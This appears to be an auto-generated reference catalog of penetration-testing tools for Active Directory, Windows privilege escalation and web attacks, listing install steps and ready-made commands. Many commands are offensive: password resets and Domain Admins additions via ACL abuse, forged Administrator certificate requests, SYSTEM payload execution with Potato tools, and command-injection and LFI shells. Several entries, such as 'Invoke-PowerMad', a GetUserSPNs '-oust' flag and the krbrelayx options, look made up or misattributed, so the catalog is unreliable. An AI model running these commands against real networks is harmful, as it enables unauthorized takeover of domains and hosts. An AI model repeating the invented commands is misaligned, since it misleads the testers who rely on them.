- Tags: ad, ldap, enumeration, go, windapsearch
- Install (kali): go install github.com/ropnop/windapsearch@latest
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/windapsearch/windapsearch/windapsearch.py
- Notes: Requires Go compiler; or download precompiled binary [toolkit-synced]
- Commands (2):
  - **Enumerate AD users via LDAP**: `windapsearch -u DOMAIN\User -p Pass --dc DC_IP -U`
    - When: Enumerating all AD users with credentials
    - Output: List of sAMAccountName, displayName, and user attributes
  - **Enumerate groups and members**: `windapsearch -u DOMAIN\User -p Pass --dc DC_IP -G`
    - When: Mapping group membership in AD
    - Output: Group names and member lists
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, crackmapexec, enum4linux, kerbrute, krbrelayx, ldapnomnom

#### adidnsdump — adidnsdump
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: linux, windows
- Purpose: Dump AD DNS records via LDAP
- Tags: ad, dns, enumeration, ldap
- Install (kali): pip3 install adidnsdump
- Path: /home/saad/.local/bin/adidnsdump
- Notes: Requires LDAP access to domain controller
- Commands (2):
  - **Dump AD DNS records**: `adidnsdump -u DOMAIN\User -p Pass --dc DC_IP -r`
    - When: Enumerating internal DNS to find all domain hosts
    - Output: Full DNS zone dump with hostnames and IPs
  - **Dump DNS with domain credentials**: `adidnsdump -u DOMAIN\User -p Pass --dc DC_IP -r --dns-tcp`
    - When: When DNS over TCP is required
    - Output: DNS records retrieved over TCP
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — bloodhound, bloodyad, certify, coercer, crackmapexec, enum4linux, kerbrute, krbrelayx, ldapnomnom, ldaprelayscan

#### ldeep — ldeep
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: linux, windows
- Purpose: Deep LDAP enumeration for Active Directory
- Tags: ad, ldap, enumeration, deep
- Install (kali): pip3 install ldeep
- Path: /home/saad/.local/bin/ldeep
- Notes: Requires LDAP bind credentials
- Commands (2):
  - **Enumerate all AD users via LDAP**: `ldeep ldap -u DOMAIN\User -p Pass --dc DC_IP '(&(objectClass=user)(objectCategory=person))'`
    - When: Deep user enumeration beyond basic ldapsearch
    - Output: Detailed user attributes including SPN, UAC, and group membership
  - **Enumerate trusts and foreign principals**: `ldeep ldap -u DOMAIN\User -p Pass --dc DC_IP '(objectClass=trustedDomain)'`
    - When: Mapping trust relationships for cross-domain attacks
    - Output: Trust direction, type, and target domain information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, crackmapexec, enum4linux, kerbrute, krbrelayx, ldapnomnom

#### certify — Certify
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: windows
- Purpose: Active Directory Certificate Services enumeration and exploitation
- Tags: ad, adcs, certificates, esc1, esc4, esc8
- Install (kali): Download from GhostPack GitHub releases
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/Certify/Certify/Certify.exe
- Notes: Run on Windows target with .NET; requires domain credentials [toolkit-synced]
- Commands (2):
  - **Find vulnerable AD CS templates**: `Certify.exe find /vulnerable`
    - When: Enumerating AD CS for ESC1-ESC13 vulnerabilities
    - Output: List of vulnerable templates with ESC flags
  - **Request certificate from vulnerable template**: `Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:Administrator`
    - When: ESC1 exploitation with ENROLLEE_SUPPLIES_SUBJECT
    - Output: PFX certificate for requested identity
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, buffer-overflow
- Related Tools: 10 — adidnsdump, bloodyad, certipy, coercer, krbrelayx, ldapnomnom, ldaprelayscan, ldeep, nxc, petitpotam

#### bloodyad — BloodyAD
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: linux, windows
- Purpose: AD privilege escalation without WinAPI (LDAP/Kerberos only)
- Tags: ad, acl-abuse, privilege-escalation, ldap
- Install (kali): pip3 install bloodyad
- Path: /home/saad/.local/bin/bloodyad
- Notes: Python3 tool; requires LDAP/Kerberos access
- Commands (2):
  - **Reset user password via ACL abuse**: `bloodyad.py -u User -p Pass -d DOMAIN --dc DC_IP set password TargetUser NewPass123`
    - When: Abusing GenericAll/ForceChangePassword on a user
    - Output: Password reset confirmation
  - **Add user to Domain Admins**: `bloodyad.py -u User -p Pass -d DOMAIN --dc DC_IP add user TargetUser to group "Domain Admins"`
    - When: Abusing GenericAll on a group object
    - Output: User added to Domain Admins group
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, certify, coercer, enum4linux, krbrelayx, ldapnomnom, ldaprelayscan, ldapsearch, ldeep, nxc

#### plumhound — PlumHound
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: linux
- Purpose: BloodHound-based automated attack path reporting
- Tags: ad, bloodhound, reporting, attack-paths
- Install (kali): pip3 install plumhound
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/PlumHound
- Notes: Requires BloodHound JSON files from SharpHound/BloodHound-python [toolkit-synced]
- Commands (2):
  - **Generate PlumHound report**: `plumhound -f bh_files/ -o plumhound_report/`
    - When: Automating attack path analysis from BloodHound data
    - Output: HTML report with prioritized attack paths
  - **Run specific PlumHound analysis**: `plumhound -f bh_files/ -p PlumHound/ADSec/DAtoDA`
    - When: Checking for Domain Admin to Domain Admin paths
    - Output: Specific attack path report
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, krbrelayx, ldapnomnom, ldaprelayscan, ldeep, nxc

#### ldaprelayscan — LdapRelayScan
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: linux, windows
- Purpose: Check for LDAP relay attack vectors
- Tags: ad, ldap, relay, ntlm-relay
- Install (kali): git clone https://github.com/zyn3rgy/LdapRelayScan
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/LdapRelayScan/LdapRelayScan.py
- Notes: Python3 script; requires Impacket [toolkit-synced]
- Commands (2):
  - **Check LDAP relay vulnerability**: `python3 LdapRelayScan.py -t DC_IP -u DOMAIN\User -p Pass`
    - When: Checking if LDAP relay is possible against DC
    - Output: LDAP signing requirement status and relay feasibility
  - **Detect LDAP relay vulnerabilities**: `python3 -m ldaprelayscan -t ldaps://TARGET_IP`
    - When: When LDAP signing is not required - test for relay to AD services
    - Output: Flags vulnerable LDAP endpoints that accept relayed authentication
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodyad, certify, coercer, enum4linux, krbrelayx, ldapnomnom, ldapsearch, ldeep, nxc

#### krbrelayx — KrbRelayX
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: linux
- Purpose: Kerberos and NTLM relay exploitation framework
- Tags: ad, kerberos, relay, unconstrained-delegation
- Install (kali): pip3 install krbrelayx
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/krbrelayx/krbrelayx.py
- Notes: Python3 tool by Dirk-jan Mollema [toolkit-synced]
- Commands (2):
  - **Start KrbRelayX listener**: `krbrelayx.py -t ldap://DC_IP`
    - When: Relaying Kerberos/NTLM auth to LDAP on DC
    - Output: Relayed authentication and potential privilege escalation
  - **S4U2Self attack with KrbRelayX**: `krbrelayx.py -t ldap://DC_IP -u User -p Pass --impersonate Administrator`
    - When: Impersonating any user via constrained delegation
    - Output: Service ticket for impersonated user
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, buffer-overflow
- Related Tools: 10 — adidnsdump, bloodyad, certify, coercer, kerbrute, ldapnomnom, ldaprelayscan, ldeep, nxc, petitpotam

#### pre2k — Pre2K
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: linux, windows
- Purpose: Attack pre-Windows 2000 computer accounts with weak passwords
- Tags: ad, pre2k, computer-accounts, legacy
- Install (kali): pip3 install pre2k
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/pre2k
- Notes: Python3 tool [toolkit-synced]
- Commands (2):
  - **Enumerate and exploit pre-2000 computer accounts**: `pre2k.py -d DOMAIN --dc DC_IP -u User -p Pass --mode machines`
    - When: Finding legacy computer accounts with weak passwords
    - Output: Computer account passwords and potential DA access
  - **Request offline TGTs for users**: `python3 GetUserSPNs.py -request -dc-ip DC_IP DOMAIN/users.txt -oust pre2k_tickets/`
    - When: After enumerating users - request service tickets without credentials
    - Output: TGS tickets saved as .kirbi files for offline cracking with hashcat
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, asrep-roasting
- Related Tools: 10 — adidnsdump, bloodyad, certify, coercer, krbrelayx, ldapnomnom, ldaprelayscan, ldeep, nxc, petitpotam

#### powermad — Powermad
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: windows
- Purpose: Create machine accounts for RBCD attacks
- Tags: ad, rbcd, machine-accounts, powershell
- Install (kali): Download from Kevin-Robertson/Powermad GitHub
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/PowerMad/Powermad.ps1
- Notes: Import-Module .\Powermad.ps1 in PowerShell [toolkit-synced]
- Commands (2):
  - **Create new machine account**: `Import-Module .\Powermad.ps1; New-MachineAccount -MachineName EvilPC$ -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)`
    - When: Creating attacker-controlled computer account for RBCD
    - Output: New computer account created in AD
  - **Check for AD privilege escalation vectors**: `powershell -exec bypass -Command "Import-Module .\PowerMad.ps1; Invoke-PowerMad -Domain DOMAIN -DomainController DC_IP"`
    - When: After domain user access - enumerate writeable AD object permissions
    - Output: Lists accounts with DCSync, RBCD write, or GenericAll privileges
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, evil-winrm, krbrelayx, ldapnomnom, ldaprelayscan, ldeep

#### seatbelt — Seatbelt
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: windows
- Purpose: Situational awareness and host enumeration post-compromise
- Tags: ad, enumeration, windows, ghostpack,  situational-awareness
- Install (kali): Download from GhostPack GitHub releases
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/Seatbelt/Seatbelt/bin/Release/Seatbelt.exe
- Notes: Run on Windows target; no installation required [toolkit-synced]
- Commands (2):
  - **Run all Seatbelt checks**: `Seatbelt.exe -group=all`
    - When: Comprehensive Windows host enumeration after initial access
    - Output: Color-coded output of all checks
  - **Run specific check groups**: `Seatbelt.exe -group=user,system,av`
    - When: Targeted enumeration of users, system info, and AV/EDR
    - Output: Filtered enumeration results
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, asrep-roasting
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, crackmapexec, enum4linux, kerbrute, krbrelayx, ldapnomnom

#### ldapnomnom — LdapNomNom
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: linux, windows
- Purpose: Ultra-fast LDAP username enumeration via NTLM auth
- Tags: ad, ldap, enumeration, go, fast
- Install (kali): go install github.com/lkarlslund/ldapnomnom@latest
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/ldapnomnom/ldapnomnom
- Notes: Requires Go compiler [toolkit-synced]
- Commands (2):
  - **Enumerate AD users via LDAP**: `ldapnomnom -server DC_IP -domain DOMAIN -user User -pass Pass -mode users`
    - When: Fast enumeration of all AD users
    - Output: List of usernames and account statuses
  - **Enumerate groups and members**: `ldapnomnom -server DC_IP -domain DOMAIN -user User -pass Pass -mode groups`
    - When: Fast group enumeration
    - Output: Group names and member lists
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, crackmapexec, enum4linux, kerbrute, krbrelayx, ldaprelayscan

#### sherlock — Sherlock
- Zone: privilege-escalation | Category: privilege-escalation | Type: enumeration
- OS: windows
- Purpose: Windows privilege escalation vulnerability scanner
- Tags: privesc, windows, powershell, vulnerability-scanner
- Install (kali): Download from GitHub: Sherlock-sec/Sherlock
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/PowerSploit/PowerSploit/Exfiltration/Invoke-Sherlock.ps1
- Notes: Import-Module .\Sherlock.ps1; Invoke-AllChecks [toolkit-synced]
- Commands (2):
  - **Run Sherlock privilege escalation checks**: `Import-Module .\Sherlock.ps1; Invoke-AllChecks`
    - When: Scanning Windows host for known privesc vulnerabilities
    - Output: List of found vulnerabilities with CVE references and exploit methods
  - **Check for specific vulnerability**: `Find-AllVulns`
    - When: Running all Sherlock checks for missing patches
    - Output: Detailed list of unpatched CVEs with exploitability
- Related Techniques: 15 — always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, sudo-misconfiguration, suid-abuse, tech:kerberoasting, tech:kernel-exploit
- Related Tools: 8 — beroot, godpotato, juicy-potato, powerup, printspoofer, privesccheck, windows-exploit-suggester, winpeas

#### privesccheck — PrivescCheck
- Zone: privilege-escalation | Category: privilege-escalation | Type: enumeration
- OS: windows
- Purpose: Comprehensive Windows privilege escalation enumeration
- Tags: privesc, windows, powershell, enumeration
- Install (kali): Download from: mbadolato/PowerShell-PrivescCheck
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/PrivescCheck/PrivescCheck.ps1
- Notes: Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended [toolkit-synced]
- Commands (2):
  - **Run extended PrivescCheck**: `Invoke-PrivescCheck -Extended`
    - When: Comprehensive Windows privesc enumeration
    - Output: Detailed report of all privesc vectors found
  - **Run specific check category**: `Invoke-PrivescCheck -Category Services,Registry,Filesystem`
    - When: Targeted enumeration of specific privesc areas
    - Output: Focused results for selected categories
- Related Techniques: 15 — always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum, persistence, registry-autorun, smb-enumeration
- Related Tools: 10 — beroot, godpotato, juicy-potato, linenum, linpeas, powerup, printspoofer, sherlock, windows-exploit-suggester, winpeas

#### beroot — BeRoot
- Zone: privilege-escalation | Category: privilege-escalation | Type: enumeration
- OS: windows, linux
- Purpose: Multi-platform privilege escalation enumeration tool
- Tags: privesc, windows, linux, cross-platform, enumeration
- Install (kali): git clone https://github.com/AlessandroZ/BeRoot
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/BeRoot/BeRoot.exe
- Notes: Windows version: BeRoot.exe; Linux: ./BeRoot.sh [toolkit-synced]
- Commands (2):
  - **Run BeRoot on Windows**: `BeRoot.exe`
    - When: Quick Windows privilege escalation check
    - Output: Color-coded findings for common privesc vectors
  - **Run BeRoot on Linux**: `./BeRoot.sh`
    - When: Quick Linux privilege escalation check
    - Output: SUID, sudo, cron, and other privesc findings
- Related Techniques: 15 — always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum, persistence, registry-autorun, smb-enumeration
- Related Tools: 10 — godpotato, juicy-potato, linenum, linpeas, linux-exploit-suggester, powerup, printspoofer, privesccheck, sherlock, windows-exploit-suggester

#### windows-exploit-suggester — Windows Exploit Suggester
- Zone: privilege-escalation | Category: privilege-escalation | Type: enumeration
- OS: windows, linux
- Purpose: Suggest Windows exploits based on missing patches
- Tags: privesc, windows, exploit-suggester, patches
- Install (kali): git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/Windows-Exploit-Suggester/windows-exploit-suggester.py
- Notes: Requires systeminfo.txt from target Windows machine [toolkit-synced]
- Commands (2):
  - **Suggest exploits from systeminfo**: `python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt`
    - When: Identifying missing patches and suggested exploits
    - Output: List of missing patches with corresponding exploits
  - **Update exploit database**: `python3 windows-exploit-suggester.py --update`
    - When: Updating the Microsoft patch database
    - Output: Updated database file
- Related Techniques: 15 — always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, metasploit-exploitation, persistence, rbcd-attack, registry-autorun, sudo-misconfiguration, suid-abuse
- Related Tools: 8 — beroot, godpotato, juicy-potato, powerup, printspoofer, privesccheck, sherlock, winpeas

#### juicy-potato — Juicy Potato
- Zone: privilege-escalation | Category: privilege-escalation | Type: exploitation
- OS: windows
- Purpose: Token impersonation privilege escalation via COM
- Tags: privesc, windows, potato, token-impersonation, seimpersonate
- Install (kali): Download from: ohpe/juicy-potato
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/juicy-potato/JuicyPotato.exe
- Notes: Requires SeImpersonatePrivilege and valid CLSID for OS version [toolkit-synced]
- Commands (2):
  - **Run Juicy Potato for SYSTEM shell**: `JuicyPotato.exe -l 1337 -p C:\payload.exe -t * -c {CLSID}`
    - When: Escalating to SYSTEM via token impersonation
    - Output: Spawns payload as SYSTEM
  - **Juicy Potato with custom CLSID**: `JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami' -t * -c {CLSID}`
    - When: Testing CLSID and command execution
    - Output: Command output as SYSTEM
- Related Techniques: 15 — always-install-elevated, constrained-delegation-s4u, cron-jobs, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, sudo-misconfiguration, suid-abuse, tech:kerberoasting
- Related Tools: 8 — beroot, godpotato, powerup, printspoofer, privesccheck, sherlock, windows-exploit-suggester, winpeas

#### printspoofer — PrintSpoofer
- Zone: privilege-escalation | Category: privilege-escalation | Type: exploitation
- OS: windows
- Purpose: Privilege escalation via Print Spooler named pipe impersonation
- Tags: privesc, windows, printspoofer, potato, seimpersonate
- Install (kali): Download from: itm4n/PrintSpoofer
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/PrintSpoofer/PrintSpoofer.exe
- Notes: Requires SeImpersonatePrivilege; works on Win 10/Server 2016-2019 [toolkit-synced]
- Commands (2):
  - **Spawn SYSTEM cmd with PrintSpoofer**: `PrintSpoofer.exe -i -c cmd`
    - When: Reliable SYSTEM escalation on modern Windows
    - Output: SYSTEM command prompt
  - **PrintSpoofer with reverse shell**: `PrintSpoofer.exe -c "C:\payload.exe"`
    - When: Executing custom payload as SYSTEM
    - Output: Payload executed with SYSTEM privileges
- Related Techniques: 15 — always-install-elevated, constrained-delegation-s4u, cron-jobs, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, sudo-misconfiguration, suid-abuse, tech:kerberoasting
- Related Tools: 8 — beroot, godpotato, juicy-potato, powerup, privesccheck, sherlock, windows-exploit-suggester, winpeas

#### godpotato — GodPotato
- Zone: privilege-escalation | Category: privilege-escalation | Type: exploitation
- OS: windows
- Purpose: Latest Potato exploit for wide Windows version compatibility
- Tags: privesc, windows, godpotato, potato, seimpersonate, dcom
- Install (kali): Download from: BeichenDream/GodPotato
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/GodPotato/GodPotato.exe
- Notes: Requires SeImpersonatePrivilege; works on most Windows versions [toolkit-synced]
- Commands (2):
  - **GodPotato SYSTEM shell**: `GodPotato.exe -cmd "cmd /c whoami"`
    - When: Testing SYSTEM escalation on any Windows version
    - Output: whoami output showing nt authority\system
  - **GodPotato with payload**: `GodPotato.exe -cmd "C:\payload.exe"`
    - When: Executing custom payload as SYSTEM
    - Output: Payload execution with SYSTEM privileges
- Related Techniques: 15 — always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, sudo-misconfiguration, suid-abuse, tech:kerberoasting, tech:kernel-exploit
- Related Tools: 8 — beroot, juicy-potato, powerup, printspoofer, privesccheck, sherlock, windows-exploit-suggester, winpeas

#### commix — Commix
- Zone: web | Category: web | Type: exploitation
- OS: linux, windows, macos
- Purpose: Automated OS command injection exploitation tool
- Tags: web, command-injection, rce, automation, exploitation
- Install (kali): sudo apt install -y commix
- Path: /usr/bin/commix
- Notes: Pre-installed on Kali
- Commands (2):
  - **Test for command injection**: `commix --url="http://TARGET/ping.php?ip=8.8.8.8"`
    - When: Automated detection of command injection vulnerabilities
    - Output: Detected injection type and available exploitation options
  - **Get interactive OS shell**: `commix --url="http://TARGET/ping.php?ip=8.8.8.8" --os-shell`
    - When: Exploiting confirmed command injection for shell access
    - Output: Interactive OS command shell via web interface
- Related Techniques: 15 — buffer-overflow, burp-workflow, c2-establishment, cmdi-advanced, default-creds-iot, file-inclusion, firmware-cgi-injection, format-string, format-string-exploit, heap-tcache-poison
- Related Tools: 10 — burp-suite, cmsmap, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite, liffy

#### liffy — Liffy
- Zone: web | Category: web | Type: exploitation
- OS: linux
- Purpose: Automated LFI to RCE exploitation tool
- Tags: web, lfi, rce, automation, file-inclusion
- Install (kali): git clone https://github.com/rotlogix/liffy
- Path: /home/saad/Desktop/cpent-toolkit/04-web-application/liffy/liffy.py
- Notes: Python3 script [toolkit-synced]
- Commands (2):
  - **LFI to RCE via log poisoning**: `python3 liffy.py -u "http://TARGET/index.php?page=" -l`
    - When: Automating log poisoning LFI exploitation
    - Output: RCE via poisoned log file
  - **LFI to RCE via data:// wrapper**: `python3 liffy.py -u "http://TARGET/index.php?page=" -d`
    - When: Using data:// wrapper for RCE without log access
    - Output: RCE via data:// stream wrapper
- Related Techniques: 15 — buffer-overflow, burp-workflow, cmdi-advanced, default-creds-iot, file-inclusion, firmware-cgi-injection, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### lfisuite — LFISuite
- Zone: web | Category: web | Type: exploitation
- OS: linux, windows
- Purpose: Comprehensive LFI scanning and exploitation suite
- Tags: web, lfi, path-traversal, automation, scanner
- Install (kali): git clone https://github.com/D35m0nd142/LFISuite
- Path: /home/saad/Desktop/cpent-toolkit/04-web-application/LFISuite/lfisuite.py
- Notes: Python3 script [toolkit-synced]
- Commands (2):
  - **Scan for LFI vulnerabilities**: `python3 lfisuite.py`
    - When: Automated LFI detection and exploitation
    - Output: Detected LFI vulnerabilities with exploitation options
  - **Generate and test LFI payloads**: `python3 lfisuite.py -u 'http://TARGET_IP/page.php?file=FUZZ' -w /usr/share/seclists/LFI/LFI.txt`
    - When: After confirming path traversal - automate LFI exploitation
    - Output: Confirmed LFI with readable local files - reveals web root paths and config locations
- Related Techniques: 15 — buffer-overflow, burp-workflow, cmdi-advanced, default-creds-iot, file-inclusion, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, lfi-advanced
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, liffy

#### corsy — Corsy
- Zone: web | Category: web | Type: scanner
- OS: linux, windows, macos
- Purpose: CORS misconfiguration scanner
- Tags: web, cors, misconfiguration, scanner, api
- Install (kali): git clone https://github.com/corsy/corsy
- Path: /home/saad/Desktop/cpent-toolkit/04-web-application/Corsy/corsy/corsy.py
- Notes: Python3 script; requires requests library [toolkit-synced]
- Commands (2):
  - **Scan for CORS misconfigurations**: `python3 corsy.py -u TARGET_URL`
    - When: Testing CORS configuration on web applications
    - Output: List of CORS misconfigurations with severity ratings
  - **Automated CORS misconfiguration testing**: `python3 corsy.py -t http://TARGET_IP/ -o corsy-report.txt`
    - When: Web app testing - check for weak CORS policies allowing credential theft
    - Output: Reports CORS misconfigurations - Access-Control-Allow-Origin: * with credentials, null origin allowed
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, sudo-misconfiguration, tech:broken-access-control, tech:cloud-metadata, tech:csrf
- Related Tools: 10 — burp-suite, cmsmap, commix, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite, liffy

#### jwt_tool — JWT Tool
- Zone: web | Category: web | Type: exploitation
- OS: linux, windows, macos
- Purpose: JSON Web Token (JWT) analysis and exploitation toolkit
- Tags: web, jwt, api, authentication, token
- Install (kali): git clone https://github.com/ticarpi/jwt_tool
- Path: /home/saad/Desktop/cpent-toolkit/04-web-application/jwt_tool/jwt_tool.py
- Notes: Python3 script [toolkit-synced]
- Commands (2):
  - **Analyze JWT token**: `python3 jwt_tool.py JWT_TOKEN`
    - When: Inspecting JWT structure and claims
    - Output: Decoded JWT header, payload, and signature info
  - **Crack JWT secret**: `python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt`
    - When: Brute-forcing JWT HMAC secret
    - Output: Cracked secret key for token signing
- Related Techniques: 15 — buffer-overflow, burp-workflow, cmdi-advanced, crypto-analysis, default-creds-iot, file-inclusion, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, lfisuite, liffy

#### xsstrike — XSStrike
- Zone: web | Category: web | Type: scanner
- OS: linux, windows, macos
- Purpose: Advanced XSS detection and exploitation suite
- Tags: web, xss, scanner, fuzzing
- Install (kali): git clone https://github.com/s0md3v/XSStrike
- Path: /home/saad/Desktop/cpent-toolkit/04-web-application/XSStrike/xsstrike.py
- Notes: Python3 script [toolkit-synced]
- Commands (2):
  - **Scan for XSS vulnerabilities**: `python3 xsstrike.py -u "http://TARGET/search?q=test"`
    - When: Detecting reflected XSS in web applications
    - Output: List of vulnerable parameters with working payloads
  - **Crawl and scan for XSS**: `python3 xsstrike.py -c true -u "http://TARGET/"`
    - When: Crawling site and testing all parameters for XSS
    - Output: All discovered XSS vulnerabilities
- Related Techniques: 15 — buffer-overflow, burp-workflow, cmdi-advanced, credential-harvesting-advanced, default-creds-iot, file-inclusion, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### testssl-sh — testssl.sh
- Zone: web | Category: web | Type: scanner
- OS: linux, windows, macos
- Purpose: TLS/SSL configuration and vulnerability scanner
- Tags: web, tls, ssl, scanner, cryptography
- Install (kali): sudo apt install -y testssl.sh
- Path: /usr/bin/testssl.sh
- Notes: Pre-installed on Kali
- Commands (2):
  - **Full TLS/SSL scan**: `testssl.sh TARGET_IP`
    - When: Comprehensive TLS/SSL configuration testing
    - Output: Detailed report of TLS settings, ciphers, and vulnerabilities
  - **Quick TLS scan**: `testssl.sh -e -p -s TARGET_IP`
    - When: Quick check for protocol support and cipher suites
    - Output: Fast overview of TLS configuration
- Related Techniques: 15 — burp-workflow, cmdi-advanced, crypto-analysis, file-inclusion, lfi-advanced, nvram-analysis, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### paramspider — ParamSpider
- Zone: web | Category: web | Type: enumerator
- OS: linux, windows, macos
- Purpose: Parameter discovery from web archives and sources
- Tags: web, parameter-discovery, recon, fuzzing
- Install (kali): git clone https://github.com/devanshbatham/ParamSpider
- Path: /home/saad/.local/bin/paramspider
- Notes: Python3 script
- Commands (2):
  - **Mine parameters from domain**: `python3 paramspider.py -d TARGET_DOMAIN -o output.txt`
    - When: Finding injectable parameters from web archives
    - Output: List of URLs with parameters for testing
  - **High-risk parameter mining**: `python3 paramspider.py -d TARGET_DOMAIN -l high -o high_risk.txt`
    - When: Focusing on high-risk parameters (id, file, page, etc.)
    - Output: High-risk parameter list
- Related Techniques: 15 — arp-discovery, burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, passive-recon, sql-injection, ssrf, tech:broken-access-control
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite

#### cmsmap — CMSmap
- Zone: web | Category: web | Type: scanner
